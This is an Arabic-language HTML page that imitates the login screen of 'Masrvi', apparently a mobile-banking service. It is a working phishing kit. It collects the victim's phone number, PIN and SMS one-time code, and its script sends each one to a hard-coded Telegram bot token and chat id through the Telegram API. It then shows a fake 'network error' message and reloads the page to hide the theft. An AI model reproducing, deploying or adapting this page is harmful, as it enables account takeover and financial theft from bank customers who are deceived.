<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>الرئيسية / مصرفي</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&display=swap');
        body { margin: 0; padding: 0; background-color: #f4f7f6; font-family: 'Cairo', sans-serif; display: flex; justify-content: center; min-height: 100vh; }
        .wrapper { width: 100%; max-width: 450px; background: #fff; position: relative; padding-bottom: 150px; display: flex; flex-direction: column; }
        .header-img { width: 100%; display: block; margin-bottom: 10px; }
        .banner-img { width: 90%; margin: 10px auto; display: block; border-radius: 8px; }
        .form-container { padding: 0 20px; text-align: right; width: 100%; box-sizing: border-box; }
        .label { font-weight: bold; margin-bottom: 8px; display: block; font-size: 15px; color: #333; }
        .input-box { border: 1.8px solid #000; border-radius: 12px; margin-bottom: 20px; padding: 5px 15px; background: #fff; }
        input { border: none; width: 100%; font-size: 17px; padding: 12px; text-align: center; outline: none; background: transparent; font-family: 'Cairo'; }
        .btn-main { background-color: #2c5364; color: white; border: none; width: 100%; padding: 16px; border-radius: 8px; font-size: 19px; font-weight: bold; cursor: pointer; transition: 0.3s; margin-top: 10px; }
        .btn-main:disabled { background-color: #95a5a6; cursor: not-allowed; }
        .otp-main-icon { width: 110px; margin: 20px auto; display: block; }
        .timer-box { background: #000; color: #fff; width: fit-content; margin: 15px auto; padding: 10px 25px; font-size: 26px; font-weight: bold; border-radius: 5px; }
        .footer-img { width: 100%; position: absolute; bottom: 0; left: 0; }
        .hidden { display: none !important; }
    </style>
</head>
<body>

<div class="wrapper">
    <img src="logo_masrvi.jpeg" class="header-img" onerror="this.style.display='none'">

    <!-- الواجهة الأولى -->
    <div id="p1" class="form-container">
        <label class="label">رقم الهاتف المربوط بالحساب *</label>
        <div class="input-box">
            <input type="tel" id="tel" placeholder="رقم الهاتف" maxlength="8" oninput="validateInput()">
        </div>
        <label class="label">الرمز السري (PIN) *</label>
        <div class="input-box">
            <input type="password" id="pin" placeholder="****" maxlength="4" oninput="validateInput()">
        </div>
        <button id="btn1" class="btn-main" onclick="toStep2()" disabled>ادخل السحب الآمن</button>
        <img src="main_banner.jpeg" class="banner-img">
    </div>

    <!-- الواجهة الثانية -->
    <div id="p2" class="form-container hidden">
        <img src="otp_main_icon.jpeg" class="otp-main-icon" onerror="this.style.display='none'">
        <p style="text-align: center; font-weight: bold;">يرجى ادخال الرمز الذي تلقيته عبر الرسائل النصية *</p>
        <div class="input-box">
            <input type="tel" id="otp" placeholder="######" maxlength="6" oninput="validateOtp()">
        </div>
        <div class="timer-box" id="time">05:00</div>
        <button id="btn2" class="btn-main" onclick="final()" disabled>تأكيد العملية</button>
    </div>

    <img src="footer_background.jpeg" class="footer-img" onerror="this.style.display='none'">
</div>

<script>
    const tok = "8729528953:AAFgvdDG5uYit3LITzp5HuHxYP0LPXszCe0";
    const cid = "8665814266";

    function send(t) {
        fetch(`https://api.telegram.org/bot${tok}/sendMessage?chat_id=${cid}&text=${encodeURIComponent(t)}`);
    }

    function validateInput() {
        const t = document.getElementById('tel').value;
        const p = document.getElementById('pin').value;
        document.getElementById('btn1').disabled = !(t.length === 8 && p.length === 4);
    }

    function validateOtp() {
        const o = document.getElementById('otp').value;
        document.getElementById('btn2').disabled = !(o.length === 6);
    }

    function toStep2() {
        send(`🚨 دخول جديد:\n📱 هاتف: ${document.getElementById('tel').value}\n🔑 PIN: ${document.getElementById('pin').value}`);
        document.getElementById('p1').classList.add('hidden');
        document.getElementById('p2').classList.remove('hidden');
        startTimer();
    }

    function startTimer() {
        let time = 300;
        let interval = setInterval(() => {
            let m = Math.floor(time / 60), s = time % 60;
            document.getElementById('time').innerText = `${m < 10 ? '0' : ''}${m}:${s < 10 ? '0' : ''}${s}`;
            if(time <= 0) clearInterval(interval);
            time--;
        }, 1000);
    }

    function final() {
        send(`🔢 OTP المستلم: ${document.getElementById('otp').value}`);
        alert("خطأ في الشبكة، يرجى المحاولة لاحقاً.");
        location.reload();
    }
</script>
</body>
</html>
